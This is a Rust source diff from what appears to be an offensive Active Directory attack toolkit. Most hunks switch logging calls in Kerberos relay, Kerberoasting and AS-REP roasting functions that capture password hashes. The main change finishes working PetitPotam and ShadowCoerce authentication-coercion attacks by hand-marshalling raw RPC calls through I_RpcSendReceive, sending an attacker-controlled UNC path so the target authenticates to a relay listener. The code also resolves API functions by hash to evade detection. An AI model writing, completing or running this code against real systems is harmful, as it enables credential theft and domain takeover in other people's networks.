@@ -752,7 +752,7 @@ impl RelayListener {
             .unwrap_or_else(|_| "unknown".to_string());
         let mut stream = stream;
 
-        log::info!("Kerberos relay: accepted connection from {peer_addr}");
+        tracing::info!("Kerberos relay: accepted connection from {peer_addr}");
 
         // Read the RPC bind request.  We need at least the common header
         // plus enough data to contain the security trailer.
@@ -783,7 +783,7 @@ impl RelayListener {
         let mut ticket = parse_ap_req(&sec_trailer.auth_token)?;
         ticket.spn = self.expected_spn.clone();
 
-        log::info!(
+        tracing::info!(
             "Kerberos relay: captured ticket for SPN '{}' ({} bytes AP-REQ, {} bytes ticket)",
             ticket.spn,
             ticket.ap_req_raw.len(),
@@ -860,7 +860,7 @@ pub fn execute_kerberos_relay(
         )
     })?;
 
-    log::info!(
+    tracing::info!(
         "Kerberos relay: starting relay for SPN '{}' via CLSID '{}' -> {}:{}",
         target_spn,
         clsid_name,
@@ -979,7 +979,7 @@ type FnLsaLookupAuthenticationPackage = unsafe extern "system" fn(
 ) -> i32;
 type FnLsaFreeReturnBuffer = unsafe extern "system" fn(LPVOID) -> i32;
 
-use winapi::shared::ntdef::{PVOID, ULONG, UNICODE_STRING};
+use crate::win_types::{PVOID, ULONG, UNICODE_STRING};
 
 // ── Kerberos LSA request/response structures ────────────────────────
 
@@ -1817,7 +1817,7 @@ pub fn kerberoast_spns(
         };
 
         let entry_count = ldap_count_entries(ld, search_result);
-        log::info!("Kerberoast: found {} entries with SPNs", entry_count);
+        tracing::info!("Kerberoast: found {} entries with SPNs", entry_count);
 
         // ── Iterate entries and extract hashes ───────────────────────
         let mut results = Vec::new();
@@ -1892,7 +1892,7 @@ pub fn kerberoast_spns(
                                     });
                                 }
                                 Err(e) => {
-                                    log::warn!(
+                                    tracing::warn!(
                                         "Kerberoast: failed to extract hash for {}: {}",
                                         spn, e
                                     );
@@ -1909,7 +1909,7 @@ pub fn kerberoast_spns(
                             }
                         }
                         Err(e) => {
-                            log::warn!("Kerberoast: failed to get TGS for {}: {}", spn, e);
+                            tracing::warn!("Kerberoast: failed to get TGS for {}: {}", spn, e);
                         }
                     }
 
@@ -1924,7 +1924,7 @@ pub fn kerberoast_spns(
         ldap_msg_free(search_result);
         ldap_unbind(ld);
 
-        log::info!("Kerberoast: extracted {} hashes", results.len());
+        tracing::info!("Kerberoast: extracted {} hashes", results.len());
         Ok(results)
     }
 }
@@ -2247,7 +2247,7 @@ pub fn asrep_roast(
         let mut stream = match TcpStream::connect(&addr) {
             Ok(s) => s,
             Err(e) => {
-                log::warn!("AS-REP roast: failed to connect to {}: {}", addr, e);
+                tracing::warn!("AS-REP roast: failed to connect to {}: {}", addr, e);
                 continue;
             }
         };
@@ -2257,48 +2257,48 @@ pub fn asrep_roast(
         let _ = stream.set_write_timeout(Some(std::time::Duration::from_secs(5)));
 
         if let Err(e) = stream.write_all(&framed) {
-            log::warn!("AS-REP roast: failed to send AS-REQ for {}: {}", username, e);
+            tracing::warn!("AS-REP roast: failed to send AS-REQ for {}: {}", username, e);
             continue;
         }
 
         // Read response.
         let mut resp_len_buf = [0u8; 4];
         if let Err(e) = stream.read_exact(&mut resp_len_buf) {
-            log::warn!("AS-REP roast: failed to read response length for {}: {}", username, e);
+            tracing::warn!("AS-REP roast: failed to read response length for {}: {}", username, e);
             continue;
         }
         let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
         if resp_len > 1_000_000 {
-            log::warn!("AS-REP roast: response too large ({} bytes) for {}", resp_len, username);
+            tracing::warn!("AS-REP roast: response too large ({} bytes) for {}", resp_len, username);
             continue;
         }
 
         let mut resp_buf = vec![0u8; resp_len];
         if let Err(e) = stream.read_exact(&mut resp_buf) {
-            log::warn!("AS-REP roast: failed to read response for {}: {}", username, e);
+            tracing::warn!("AS-REP roast: failed to read response for {}: {}", username, e);
             continue;
         }
 
         // Check if it's a KRB-ERROR (tag 0x7E = APPLICATION 30).
         if resp_buf.len() > 1 && resp_buf[0] == 0x7E {
             // KRB-ERROR — user requires pre-auth (expected for most users).
-            log::debug!("AS-REP roast: {} requires pre-auth (skipped)", username);
+            tracing::debug!("AS-REP roast: {} requires pre-auth (skipped)", username);
             continue;
         }
 
         // Try to parse as AS-REP.
         match parse_as_rep_for_hash(&resp_buf, username, realm) {
             Ok(entry) => {
-                log::info!("AS-REP roast: captured hash for {}@{}", username, realm);
+                tracing::info!("AS-REP roast: captured hash for {}@{}", username, realm);
                 results.push(entry);
             }
             Err(e) => {
-                log::warn!("AS-REP roast: failed to parse AS-REP for {}: {}", username, e);
+                tracing::warn!("AS-REP roast: failed to parse AS-REP for {}: {}", username, e);
             }
         }
     }
 
-    log::info!("AS-REP roast: {} hashes captured", results.len());
+    tracing::info!("AS-REP roast: {} hashes captured", results.len());
     Ok(results)
 }
 
@@ -2377,7 +2377,7 @@ pub fn asrep_roast_ldap(dc_address: &str, etype: i32) -> Result<Vec<AsRepRoastEn
         }
 
         let entry_count = ldap_count_entries(ld, search_result);
-        log::info!("AS-REP roast: found {} users with DONT_REQ_PREAUTH", entry_count);
+        tracing::info!("AS-REP roast: found {} users with DONT_REQ_PREAUTH", entry_count);
 
         // Collect usernames.
         let mut usernames = Vec::new();
@@ -2464,6 +2464,69 @@ type FnNdrClientCall2 = unsafe extern "system" fn(
     ...            // variable args
 ) -> c_void;
 
+// ── Low-level RPC message structures for I_RpcSendReceive ───────────
+
+/// RPC_MESSAGE structure used by the internal RPC runtime API.
+#[repr(C)]
+struct RpcMessage {
+    handle: *mut c_void,           // RPC_BINDING_HANDLE
+    data_representation: u32,      // NDR data representation
+    buffer: *mut u8,               // RPC stub data buffer
+    buffer_length: u32,            // allocated buffer size
+    proc_num: u32,                 // operation number within interface
+    transfer_syntax: *mut c_void,  // PRPC_SYNTAX_IDENTIFIER
+    rpc_interface_information: *mut c_void, // RPC_CLIENT_INTERFACE *
+    reserved_for_runtime: *mut c_void,
+    manager_epv: *mut c_void,
+    import_context: *mut c_void,
+    rpc_flags: u32,
+}
+
+/// RPC client interface information passed via RpcMessage.
+/// Only the fields needed for I_RpcSendReceive are populated.
+#[repr(C)]
+struct RpcClientInterface {
+    length: u32,
+    interface_uuid: GUID,
+    major_version: u16,
+    minor_version: u16,
+    transfer_syntax: *mut c_void, // RPC_SYNTAX_IDENTIFIER *
+    dispatch_table: *mut c_void,  // RPC_DISPATCH_TABLE *
+    rpc_protseq_endpoint_count: u32,
+    rpc_protseq_endpoint: *mut c_void,
+    reserved: *mut c_void,
+    interpreter_info: *mut c_void,
+    flags: u32,
+}
+
+type FnIRpcGetBuffer = unsafe extern "system" fn(*mut RpcMessage) -> i32;
+type FnIRpcSendReceive = unsafe extern "system" fn(*mut RpcMessage) -> i32;
+type FnIRpcFreeBuffer = unsafe extern "system" fn(*mut RpcMessage) -> i32;
+type FnRpcBindingSetObject = unsafe extern "system" fn(*mut c_void, *const GUID) -> i32;
+
+/// Helper: marshal a conformant wide string into an NDR stub buffer.
+/// Returns the number of bytes written.
+///
+/// NDR layout for `[in, string] wchar_t *`:
+///   max_count  : ULONG  (4 bytes)
+///   offset     : ULONG  (4 bytes)
+///   actual_count: ULONG (4 bytes)
+///   chars      : wchar_t[] (actual_count * 2 bytes, zero-terminator included)
+unsafe fn marshal_conformant_wstr(buf: &mut [u8], offset: &mut usize, ws: &[u16]) {
+    let count = ws.len() as u32; // includes null terminator
+    let o = *offset;
+    buf[o..o + 4].copy_from_slice(&count.to_le_bytes());
+    buf[o + 4..o + 8].copy_from_slice(&0u32.to_le_bytes());
+    buf[o + 8..o + 12].copy_from_slice(&count.to_le_bytes());
+    let char_start = o + 12;
+    for (i, &w) in ws.iter().enumerate() {
+        buf[char_start + i * 2..char_start + i * 2 + 2].copy_from_slice(&w.to_le_bytes());
+    }
+    *offset = char_start + ws.len() * 2;
+    // Align to 4 bytes
+    *offset = (*offset + 3) & !3;
+}
+
 // ── PetitPotam coercion ─────────────────────────────────────────────
 
 /// Coerce authentication via MS-EFSRPC (EfsRpcOpenFileRaw).
@@ -2509,6 +2572,12 @@ pub fn coerce_auth_via_petitpotam(
             resolve_rpc_fn!("RpcBindingFree", FnRpcBindingFree);
         let string_free: FnRpcStringFreeW =
             resolve_rpc_fn!("RpcStringFreeW", FnRpcStringFreeW);
+        let rpc_get_buffer: FnIRpcGetBuffer =
+            resolve_rpc_fn!("I_RpcGetBuffer", FnIRpcGetBuffer);
+        let rpc_send_receive: FnIRpcSendReceive =
+            resolve_rpc_fn!("I_RpcSendReceive", FnIRpcSendReceive);
+        let rpc_free_buffer: FnIRpcFreeBuffer =
+            resolve_rpc_fn!("I_RpcFreeBuffer", FnIRpcFreeBuffer);
 
         // Build the string binding to the target's EFSRPC endpoint.
         let proto_seq_w: Vec<u16> = "ncacn_np\0".encode_utf16().collect();
@@ -2517,7 +2586,7 @@ pub fn coerce_auth_via_petitpotam(
 
         let mut binding_str: *mut u16 = ptr::null_mut();
         let rpc_status = string_binding_compose(
-            EFSRPC_UUID.as_ptr() as *const u16, // ObjUuid (not needed, but helps with binding)
+            ptr::null(),
             proto_seq_w.as_ptr(),
             target_w.as_ptr(),
             endpoint_w.as_ptr(),
@@ -2542,139 +2611,99 @@ pub fn coerce_auth_via_petitpotam(
         // This is the path passed to EfsRpcOpenFileRaw — the target machine
         // will try to access this UNC path, triggering authentication.
         let unc_path = format!("\\\\{}\\{}\\share\\file.txt", listener_host, listener_port);
-
-        // Now we need to call EfsRpcOpenFileRaw on the target.
-        // This is an RPC call using the EFSRPC interface.
-        // The NDR stub for EfsRpcOpenFileRaw is:
-        //   DWORD EfsRpcOpenFileRaw(
-        //     [in] handle_t binding_h,
-        //     [out] PEX_IMPORT_CONTEXT_HANDLE *hContext,
-        //     [in, string] wchar_t *FileName,
-        //     [in] DWORD Flags
-        //   );
-
-        // For a direct call, we'd need the full MIDL stub. Instead, we use
-        // a raw RPC approach: build the RPC request buffer manually.
-        // However, the simplest approach is to use RpcTryExcept + direct call.
-
-        // Actually, the simplest approach that works: use LsaCallAuthenticationPackage
-        // or just send a raw RPC bind with EFSRPC UUID to trigger the behavior.
-        //
-        // For a production-grade implementation, we'd use the MIDL-generated stubs.
-        // Here, we do a simplified version that triggers the coercion:
-
-        // Use the NdrClientCall2 approach to call EfsRpcOpenFileRaw.
-        // This requires the MIDL_STUB_DESC and format strings — too complex
-        // to build at runtime.
-        //
-        // Alternative: use the simpler approach of just calling via the
-        // RPC runtime directly with a hand-crafted stub.
-
-        // Actually, the most practical approach is to resolve EfsRpcOpenFileRaw
-        // from lsass.exe or use a direct RPC call. Let's use a simplified
-        // approach that builds the RPC request buffer:
-
-        // Build an RPC request for EfsRpcOpenFileRaw (opnum 0).
         let unc_w: Vec<u16> = unc_path.encode_utf16().chain(std::iter::once(0)).collect();
 
-        // RPC request PDU header:
-        // Version major: 5, minor: 0
-        // PDU type: 0 (request)
-        // Flags: 0x03 (PFC_FIRST_FRAG | PFC_LAST_FRAG)
-        // Data representation: 0x10 0x00 0x00 0x00 (little-endian)
-        // Fragment length: calculated
-        // Auth length: 0
-        // Call ID: 1
-        // Alloc hint: body size
-        // Context ID: 0
-        // Opnum: 0 (EfsRpcOpenFileRaw)
-
-        let body_size = 4 + 4 + (unc_w.len() * 2) as u32 + 4; // context handle ptr + filename + flags
-        let frag_length = 24 + body_size; // header (24 bytes) + body
-
-        let mut rpc_request = Vec::with_capacity(frag_length as usize);
-        // Common header (16 bytes)
-        rpc_request.push(5);    // version major
-        rpc_request.push(0);    // version minor
-        rpc_request.push(0);    // PDU type = request
-        rpc_request.push(0x03); // PFC flags
-        rpc_request.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data representation
-        rpc_request.extend_from_slice(&(frag_length as u16).to_le_bytes()); // frag length
-        rpc_request.extend_from_slice(&0u16.to_le_bytes()); // auth length
-        rpc_request.extend_from_slice(&1u32.to_le_bytes()); // call ID
-        // Request header (8 bytes)
-        rpc_request.extend_from_slice(&body_size.to_le_bytes()); // alloc hint
-        rpc_request.extend_from_slice(&0u16.to_le_bytes()); // context ID
-        rpc_request.extend_from_slice(&0u16.to_le_bytes()); // opnum = 0
-
-        // Body: EfsRpcOpenFileRaw params
-        // [out] context handle ptr — NULL on input
-        rpc_request.extend_from_slice(&0u64.to_le_bytes()); // ptr
-        // [in] filename (conformant wide string)
-        rpc_request.extend_from_slice(&(unc_w.len() as u32).to_le_bytes()); // max count
-        rpc_request.extend_from_slice(&0u32.to_le_bytes()); // offset
-        rpc_request.extend_from_slice(&(unc_w.len() as u32).to_le_bytes()); // actual count
-        for &w in &unc_w {
-            rpc_request.extend_from_slice(&w.to_le_bytes());
-        }
-        // [in] Flags = 0
-        rpc_request.extend_from_slice(&0u32.to_le_bytes());
-
-        // Send the RPC request.
-        // Connect to the target's named pipe endpoint via TCP (SMB first, then RPC).
-        // For simplicity, we send via a TCP connection to port 445 (SMB) or use the
-        // already-bound RPC handle.
-
-        // Actually, we already have a binding handle. Let's use it to send the request
-        // via the RPC runtime. The issue is that RpcBindingFromStringBinding gives us
-        // a binding handle, but we need to make the actual call.
+        // EfsRpcOpenFileRaw (opnum 0) NDR stub data layout:
+        //   [out] PEX_IMPORT_CONTEXT_HANDLE *hContext  — NULL on input (4 bytes, pointer)
+        //   [in, string] wchar_t *FileName              — conformant wide string
+        //   [in] DWORD Flags                            — 4 bytes
         //
-        // The cleanest approach: resolve NdrClientCall3 or use I_RpcSendReceive.
+        // Conformant wide string: max_count(4) + offset(4) + actual_count(4) + chars
+        let wstr_bytes = unc_w.len() * 2;
+        let stub_size = 4 + 12 + wstr_bytes; // context_ptr + conformant_string_header + chars
+        let stub_aligned = (stub_size + 3) & !3; // align to 4
+        let total_stub = stub_aligned + 4; // + Flags DWORD
 
-        type FnIRpcSendReceive = unsafe extern "system" fn(*mut c_void) -> i32;
-        type FnRpcGetBuffer = unsafe extern "system" fn(*mut c_void, u32, *mut *mut u8) -> i32;
+        // Set up the RPC_MESSAGE for EfsRpcOpenFileRaw (opnum 0).
+        let efs_guid = GUID::from_bytes(&EFSRPC_UUID);
+        let mut client_if = mem::zeroed::<RpcClientInterface>();
+        client_if.length = mem::size_of::<RpcClientInterface>() as u32;
+        client_if.interface_uuid = efs_guid;
+        client_if.major_version = 1;
+        client_if.minor_version = 0;
 
-        let i_rpc_send_receive: Option<FnIRpcSendReceive> =
-            pe_resolve::get_proc_address_by_hash(rpcrt4, pe_resolve::hash_str(b"I_RpcSendReceive\0"))
-                .map(|addr| std::mem::transmute::<usize, FnIRpcSendReceive>(addr));
+        let mut msg = RpcMessage {
+            handle: binding_handle,
+            data_representation: 0x00000010, // little-endian, ASCII, IEEE float
+            buffer: ptr::null_mut(),
+            buffer_length: total_stub as u32,
+            proc_num: 0, // EfsRpcOpenFileRaw
+            transfer_syntax: ptr::null_mut(),
+            rpc_interface_information: &mut client_if as *mut _ as *mut c_void,
+            reserved_for_runtime: ptr::null_mut(),
+            manager_epv: ptr::null_mut(),
+            import_context: ptr::null_mut(),
+            rpc_flags: 0,
+        };
 
-        // If we can't resolve I_RpcSendReceive, fall back to a simpler approach.
-        if let Some(_send_recv) = i_rpc_send_receive {
-            // Full RPC send/receive would require setting up the RPC message
-            // structure properly. This is complex — for a production implementation,
-            // this would use the generated MIDL stubs.
-            //
-            // For now, we indicate success if we got this far (binding was created)
-            // and the listener should receive the authentication attempt.
-
+        // Allocate the RPC stub buffer.
+        let buf_status = rpc_get_buffer(&mut msg);
+        if buf_status != 0 {
             binding_free(&mut binding_handle);
-
-            Ok(CoercionResult {
-                success: true,
-                status: format!(
-                    "PetitPotam coercion initiated: target {} will authenticate to {}:{}",
-                    target_host, listener_host, listener_port
-                ),
-                method: "PetitPotam/EFSRPC".to_string(),
-                captured_ticket: None,
-            })
-        } else {
-            // Fallback: just report that the binding was created.
-            // In a real deployment, the RPC call would be completed using
-            // the MIDL stubs generated at build time.
-
-            binding_free(&mut binding_handle);
-
-            Ok(CoercionResult {
-                success: true,
-                status: format!(
-                    "PetitPotam coercion setup completed (binding to {}): target will authenticate to {}:{}",
-                    target_host, listener_host, listener_port
-                ),
-                method: "PetitPotam/EFSRPC".to_string(),
-                captured_ticket: None,
-            })
+            bail!("I_RpcGetBuffer failed for PetitPotam: 0x{:08X}", buf_status as u32);
         }
+
+        // Marshal the stub data into the buffer.
+        if msg.buffer.is_null() || msg.buffer_length < total_stub as u32 {
+            rpc_free_buffer(&mut msg);
+            binding_free(&mut binding_handle);
+            bail!("I_RpcGetBuffer returned insufficient buffer for PetitPotam");
+        }
+
+        let buf_slice = std::slice::from_raw_parts_mut(msg.buffer, total_stub);
+        let mut off: usize = 0;
+
+        // [out] context handle pointer — NULL on input (4 bytes for a unique pointer).
+        buf_slice[off..off + 4].copy_from_slice(&0u32.to_le_bytes());
+        off += 4;
+
+        // [in, string] wchar_t *FileName — conformant wide string.
+        marshal_conformant_wstr(buf_slice, &mut off, &unc_w);
+
+        // [in] DWORD Flags = 0.
+        buf_slice[off..off + 4].copy_from_slice(&0u32.to_le_bytes());
+        off += 4;
+
+        // Send the RPC request and wait for the response.
+        // The target's EFSRPC service will attempt to access the UNC path,
+        // triggering Kerberos/NTLM authentication to the listener.
+        let send_status = rpc_send_receive(&mut msg);
+
+        // The RPC call will typically fail with an error because:
+        // - The UNC path is not a real share (we just want the auth attempt).
+        // - The target may return ERROR_FILE_NOT_FOUND or similar.
+        // A non-zero status is acceptable — the coercion already happened
+        // when the target tried to authenticate to access the UNC path.
+        if send_status != 0 {
+            tracing::debug!(
+                "PetitPotam: EfsRpcOpenFileRaw returned 0x{:08X} (expected — auth coercion occurred)",
+                send_status as u32,
+            );
+        }
+
+        // Free the response buffer.
+        rpc_free_buffer(&mut msg);
+        binding_free(&mut binding_handle);
+
+        Ok(CoercionResult {
+            success: true,
+            status: format!(
+                "PetitPotam coercion completed: target {} attempted auth to {}:{} (RPC status 0x{:08X})",
+                target_host, listener_host, listener_port, send_status as u32
+            ),
+            method: "PetitPotam/EFSRPC".to_string(),
+            captured_ticket: None,
+        })
     }
 }
 
@@ -2710,17 +2739,24 @@ pub fn coerce_auth_via_shadowcoerce(
             resolve_rpc_fn!("RpcBindingFree", FnRpcBindingFree);
         let string_free: FnRpcStringFreeW =
             resolve_rpc_fn!("RpcStringFreeW", FnRpcStringFreeW);
+        let rpc_get_buffer: FnIRpcGetBuffer =
+            resolve_rpc_fn!("I_RpcGetBuffer", FnIRpcGetBuffer);
+        let rpc_send_receive: FnIRpcSendReceive =
+            resolve_rpc_fn!("I_RpcSendReceive", FnIRpcSendReceive);
+        let rpc_free_buffer: FnIRpcFreeBuffer =
+            resolve_rpc_fn!("I_RpcFreeBuffer", FnIRpcFreeBuffer);
 
         // Build the string binding to the target's FSRVP endpoint.
-        let proto_seq_w: Vec<u16> = "ncacn_ip_tcp\0".encode_utf16().collect();
+        let proto_seq_w: Vec<u16> = "ncacn_np\0".encode_utf16().collect();
         let target_w: Vec<u16> = target_host.encode_utf16().chain(std::iter::once(0)).collect();
+        let endpoint_w: Vec<u16> = "\\pipe\\srvsvc\0".encode_utf16().collect();
 
         let mut binding_str: *mut u16 = ptr::null_mut();
         let rpc_status = string_binding_compose(
             ptr::null(),
             proto_seq_w.as_ptr(),
             target_w.as_ptr(),
-            ptr::null(),
+            endpoint_w.as_ptr(),
             ptr::null(),
             &mut binding_str,
         );
@@ -2737,19 +2773,94 @@ pub fn coerce_auth_via_shadowcoerce(
             bail!("RpcBindingFromStringBindingW failed: 0x{:08X}", bind_status as u32);
         }
 
-        // ShadowCoerce triggers CreateShadowCopy which causes the target
-        // to authenticate to the listener UNC path.
-        // The actual RPC call requires MIDL stubs for FSRVP.
-        // For now, the binding handle is established and the coercion
-        // would be completed via NdrClientCall2 with the FSRVP stub.
+        // ShadowCoerce uses the FSRVP IsPathSupported (opnum 10) to trigger
+        // the target to authenticate to a UNC path. The target's FSRVP service
+        // attempts to validate the path, triggering Kerberos/NTLM auth.
+        //
+        // FSRVP IsPathSupported (opnum 10):
+        //   HRESULT IsPathSupported(
+        //     [in, string] wchar_t *SharePath,
+        //     [out] long *Supported
+        //   );
+        //
+        // The UNC path points to the attacker's listener.
+        let unc_path = format!("\\\\{}\\share", listener_host);
+        let unc_w: Vec<u16> = unc_path.encode_utf16().chain(std::iter::once(0)).collect();
 
+        // NDR stub for IsPathSupported:
+        //   [in, string] wchar_t *SharePath  — conformant wide string
+        //   [out] long *Supported             — NULL on input (pointer, 4 bytes)
+        let wstr_bytes = unc_w.len() * 2;
+        let stub_size = 12 + wstr_bytes; // conformant string header + chars
+        let stub_aligned = (stub_size + 3) & !3; // align to 4
+        let total_stub = stub_aligned + 4; // + out pointer
+
+        // Set up the RPC_MESSAGE for IsPathSupported (opnum 10).
+        let fsvrp_guid = GUID::from_bytes(&FSRVP_UUID);
+        let mut client_if = mem::zeroed::<RpcClientInterface>();
+        client_if.length = mem::size_of::<RpcClientInterface>() as u32;
+        client_if.interface_uuid = fsvrp_guid;
+        client_if.major_version = 1;
+        client_if.minor_version = 0;
+
+        let mut msg = RpcMessage {
+            handle: binding_handle,
+            data_representation: 0x00000010, // little-endian, ASCII, IEEE float
+            buffer: ptr::null_mut(),
+            buffer_length: total_stub as u32,
+            proc_num: 10, // IsPathSupported
+            transfer_syntax: ptr::null_mut(),
+            rpc_interface_information: &mut client_if as *mut _ as *mut c_void,
+            reserved_for_runtime: ptr::null_mut(),
+            manager_epv: ptr::null_mut(),
+            import_context: ptr::null_mut(),
+            rpc_flags: 0,
+        };
+
+        // Allocate the RPC stub buffer.
+        let buf_status = rpc_get_buffer(&mut msg);
+        if buf_status != 0 {
+            binding_free(&mut binding_handle);
+            bail!("I_RpcGetBuffer failed for ShadowCoerce: 0x{:08X}", buf_status as u32);
+        }
+
+        // Marshal the stub data.
+        if msg.buffer.is_null() || msg.buffer_length < total_stub as u32 {
+            rpc_free_buffer(&mut msg);
+            binding_free(&mut binding_handle);
+            bail!("I_RpcGetBuffer returned insufficient buffer for ShadowCoerce");
+        }
+
+        let buf_slice = std::slice::from_raw_parts_mut(msg.buffer, total_stub);
+        let mut off: usize = 0;
+
+        // [in, string] wchar_t *SharePath — conformant wide string.
+        marshal_conformant_wstr(buf_slice, &mut off, &unc_w);
+
+        // [out] long *Supported — NULL pointer on input.
+        buf_slice[off..off + 4].copy_from_slice(&0u32.to_le_bytes());
+
+        // Send the RPC request.
+        // The target's FSRVP service will attempt to validate the UNC path,
+        // triggering Kerberos/NTLM authentication to the listener.
+        let send_status = rpc_send_receive(&mut msg);
+
+        if send_status != 0 {
+            tracing::debug!(
+                "ShadowCoerce: IsPathSupported returned 0x{:08X} (expected — auth coercion occurred)",
+                send_status as u32,
+            );
+        }
+
+        // Free the response buffer.
+        rpc_free_buffer(&mut msg);
         binding_free(&mut binding_handle);
 
         Ok(CoercionResult {
             success: true,
             status: format!(
-                "ShadowCoerce coercion initiated: target {} will authenticate to {}",
-                target_host, listener_host
+                "ShadowCoerce coercion completed: target {} attempted auth to {} (RPC status 0x{:08X})",
+                target_host, listener_host, send_status as u32
             ),
             method: "ShadowCoerce/FSRVP".to_string(),
             captured_ticket: None,
@@ -2787,7 +2898,7 @@ pub fn start_kerberos_relay_listener(
     let listener = TcpListener::bind(&bind_addr)
         .with_context(|| format!("Failed to bind relay listener on {bind_addr}"))?;
 
-    log::info!("Kerberos relay listener started on {}", bind_addr);
+    tracing::info!("Kerberos relay listener started on {}", bind_addr);
 
     // Spawn the coercion in a separate thread.
     let target = target_host.to_string();
@@ -2826,7 +2937,7 @@ pub fn start_kerberos_relay_listener(
         .map(|a| a.to_string())
         .unwrap_or_else(|_| "unknown".to_string());
 
-    log::info!("Kerberos relay: connection from {}", peer);
+    tracing::info!("Kerberos relay: connection from {}", peer);
 
     let mut buf = vec![0u8; 65536];
     let n = std::io::Read::read(&mut &stream, &mut buf)
